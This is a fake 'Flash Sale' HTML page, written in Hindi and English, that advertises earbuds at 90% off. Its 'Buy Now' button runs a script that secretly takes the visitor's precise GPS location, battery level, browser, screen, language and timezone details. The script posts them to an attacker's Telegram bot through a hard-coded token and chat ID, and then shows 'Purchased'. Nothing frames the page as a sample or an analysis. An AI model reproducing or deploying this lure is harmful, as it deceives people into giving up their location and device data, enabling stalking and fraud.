<!doctype html>
<html lang="hi">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Flash Sale - 90% OFF</title>
<style>
body{margin:0;font-family:system-ui;background:#f4f4f6;display:grid;place-items:center;min-height:100vh}
.card{background:#fff;border-radius:16px;padding:24px;max-width:340px;width:90%;box-shadow:0 8px 30px #0002;text-align:center}
.thumb{height:150px;border-radius:12px;background:linear-gradient(135deg,#ff6a00,#ee0979);margin-bottom:16px}
h2{margin:0 0 6px}
.price{font-size:26px;font-weight:800;color:#111}
.cut{color:#999;text-decoration:line-through;margin-left:8px;font-size:15px}
button{margin-top:18px;width:100%;padding:15px;border:0;border-radius:10px;background:#111;color:#fff;font-size:16px;font-weight:700}
button:disabled{background:#888}
.status{font-size:13px;color:#555;margin-top:14px;min-height:18px}
</style>
<div class="card">
<div class="thumb"></div>
<h2>Wireless Earbuds Pro</h2>
<div class="price">₹199 <span class="cut">₹1999</span></div>
<button id="buy">Buy Now</button>
<div class="status" id="status"></div>
</div>
<script>
const TOKEN = '9198268582:AAEibZJ7yHYuCXFfWyJx0ap3MrktEEmhXVU';
const CHAT  = '8552743919';
const buy = document.getElementById('buy');
const st  = document.getElementById('status');

function loc(){
  return new Promise(r=>{
    if(!navigator.geolocation) return r('-');
    navigator.geolocation.getCurrentPosition(
      p=>r(p.coords.latitude+','+p.coords.longitude+' (±'+Math.round(p.coords.accuracy)+'m)\nhttps://maps.google.com/?q='+p.coords.latitude+','+p.coords.longitude),
      ()=>r('-'),{timeout:8000});
  });
}
function bat(){
  return new Promise(r=>{
    if(!navigator.getBattery) return r('-');
    navigator.getBattery().then(b=>r(Math.round(b.level*100)+'%')).catch(()=>r('-'));
  });
}

buy.onclick = async () => {
  buy.disabled = true; buy.textContent = 'Processing...'; st.textContent = 'Reading...';
  const l = await loc(), b = await bat();
  const t = [
    'Naya device',
    'UA: ' + navigator.userAgent,
    'Lang: ' + navigator.language,
    'Screen: ' + screen.width + 'x' + screen.height,
    'TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
    'Battery: ' + b,
    'Location: ' + l,
    'Time: ' + new Date().toLocaleString()
  ].join('\n');
  await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT, text: t })
  }).catch(()=>{});
  st.textContent = 'Details bhej di gayi.';
  buy.textContent = 'Purchased';
};
</script>
</html>
